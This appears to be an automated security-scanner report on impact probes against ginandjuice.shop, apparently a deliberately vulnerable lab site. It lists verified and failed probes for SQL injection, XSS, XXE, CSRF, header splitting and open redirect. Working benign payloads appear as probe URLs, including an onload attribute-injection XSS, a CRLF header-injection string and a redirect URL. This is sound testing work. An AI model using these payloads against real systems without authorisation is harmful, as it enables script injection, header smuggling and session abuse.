# L3 Proven Real Impact — https://ginandjuice.shop
run `run-1738d74ba4` — layer sentinel-impact/4.4.0

- impacts: 9 total / **5 VERIFIED** / 1 INFERRED / 3 PROBE_FAILED / 0 NOT_SAFE_TO_PROVE / 0 REFUSED
- safety ceiling: capability proven, not exploited — أُثبتت القدرة، لم تُستغَل

## sql_version_oracle — PROBE_FAILED
- path `L3P-5d374ffbfd` findings ['F-277b70ea40'] — sql_version_oracle at /catalog (param category) — minimal benign proof
- reason: the boolean oracle did not separate on this run (measured sizes below) — honest failure, never a fake proof
- detail: `{"control_true_size": 17106, "control_false_size": 9421, "version_true_size": 3761, "version_false_size": 3761, "control_separated": true, "version_separated": false}`

## xss_browser_execution — PROBE_FAILED
- path `L3P-5ff0ac3140` findings ['F-4df129b258'] — xss_browser_execution at /catalog (param category) — minimal benign proof
- reason: the browser did not execute the planned canary (measured below) — honest failure, never a fake proof
- detail: `{"fired": false, "observed_flag": "", "expected_flag": "l3canary"}`

## xxe_file_read — PROBE_FAILED
- path `L3P-09fc51a522` findings ['F-98386c0986'] — xxe_file_read at /catalog/product/stock (param productId) — minimal benign proof
- reason: the file-read response carried no hostname-class content beyond the control (blind on this run) — honest failure, never a fake proof
- detail: `{"control_body_len": 41, "read_body_len": 41, "control_excerpt": "\"Product ID could not be parsed from XML\"", "read_excerpt": "\"Product ID could not be parsed from XML\""}`

## csrf_own_session_state_change — VERIFIED
- path `L3P-8ed7b47d89` findings ['F-d8bbff4e3e'] — csrf_own_session_state_change at /catalog/cart (param productId, redir, quantity) — minimal benign proof
- detail: `{"origin": "https://csrf-probe.example", "cross_origin_status": 200, "state_changed": true, "new_state_tokens": ["image", "item", "left", "productcatalog", "products"]}`
- evidence [probe] pr-0012: 'productId=1&redir=PRODUCT&quantity=1'
  - probe: POST https://ginandjuice.shop/catalog/cart body='productId=1&redir=PRODUCT&quantity=1'
  - response: status 200 body='<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labh'
- evidence [probe] pr-0013: 'productcatalog'
  - probe: GET https://ginandjuice.shop/catalog/cart body=''
  - response: status 200 body='<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labh'
- evidence [probe] pr-0011: '<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n    '
  - probe: GET https://ginandjuice.shop/catalog/cart body=''
  - response: status 200 body='<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labh'

## header_split_proof — VERIFIED
- path `L3P-662b572b29` findings ['F-e6ca09b8b8'] — header_split_proof at /catalog (param category) — minimal benign proof
- detail: `{"header": "x-sentinel-l3-proof", "value": "capability-proven; Secure; HttpOnly"}`
- evidence [probe] pr-0014: 'capability-proven; Secure; HttpOnly'
  - probe: GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0Ax-sentinel-l3-proof%3a%20capability-proven body=''
  - response: status 200 body='<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labh'

## open_redirect_navigation — VERIFIED
- path `L3P-a3e09ad44e` findings ['F-ef23b8b42b'] — open_redirect_navigation at /blog/ (param search) — minimal benign proof
- detail: `{"landed_url": "http://127.0.0.1:39709/l3redir-ab12"}`
- evidence [probe] pr-0015: 'http://127.0.0.1:39709/l3redir-ab12'
  - probe: GET https://ginandjuice.shop/blog/?search=1&back=http%3A%2F%2F127.0.0.1%3A39709%2Fl3redir-ab12 body=''
  - response: status 200 body=''

## xss_browser_execution — VERIFIED
- path `L3P-6228caf053` findings ['F-fc86abef99'] — xss_browser_execution at /blog/ (param search) — minimal benign proof
- detail: `{"variant": "attr_inject_onload", "flag": "l3domcanary"}`
- evidence [probe] pr-0016: 'l3domcanary'
  - probe: GET https://ginandjuice.shop/blog/?search=%22+onload%3D%22window.__SENTINEL_XSS__%3D%27l3domcanary%27%22 body=''
  - response: status 200 body=''

## chain_conjunction — VERIFIED
- path `L3PC-5f7b863170` findings ['F-fc86abef99', 'F-d8bbff4e3e'] — chain terminal impact — CHAIN-XSS-CSRF (F-fc86abef99 + F-d8bbff4e3e)
- detail: `{"legs": [{"probe_kind": "xss_browser_execution", "status": "VERIFIED"}, {"probe_kind": "csrf_own_session_state_change", "status": "VERIFIED"}]}`
- evidence [probe] pr-0016: 'l3domcanary'
  - probe: GET https://ginandjuice.shop/blog/?search=%22+onload%3D%22window.__SENTINEL_XSS__%3D%27l3domcanary%27%22 body=''
  - response: status 200 body=''
- evidence [probe] pr-0012: 'productId=1&redir=PRODUCT&quantity=1'
  - probe: POST https://ginandjuice.shop/catalog/cart body='productId=1&redir=PRODUCT&quantity=1'
  - response: status 200 body='<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labh'
- evidence [probe] pr-0013: 'productcatalog'
  - probe: GET https://ginandjuice.shop/catalog/cart body=''
  - response: status 200 body='<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labh'
- evidence [probe] pr-0011: '<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n    '
  - probe: GET https://ginandjuice.shop/catalog/cart body=''
  - response: status 200 body='<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labh'

## chain_conjunction — INFERRED
- path `L3PC-8321d42c89` findings ['F-4df129b258', 'F-d8bbff4e3e'] — chain terminal impact — CHAIN-XSS-CSRF (F-4df129b258 + F-d8bbff4e3e)
- reason: terminal impact not proven: the xss_browser_execution leg(s) did not verify fresh in this run — the whole chain stays INFERRED (weakest-link rule, same as L2)
- detail: `{"legs": [{"probe_kind": "xss_browser_execution", "status": "PROBE_FAILED"}, {"probe_kind": "csrf_own_session_state_change", "status": "VERIFIED"}]}`
- evidence [probe] pr-0012: 'productId=1&redir=PRODUCT&quantity=1'
  - probe: POST https://ginandjuice.shop/catalog/cart body='productId=1&redir=PRODUCT&quantity=1'
  - response: status 200 body='<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labh'
- evidence [probe] pr-0013: 'productcatalog'
  - probe: GET https://ginandjuice.shop/catalog/cart body=''
  - response: status 200 body='<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labh'
- evidence [probe] pr-0011: '<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n    '
  - probe: GET https://ginandjuice.shop/catalog/cart body=''
  - response: status 200 body='<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labh'

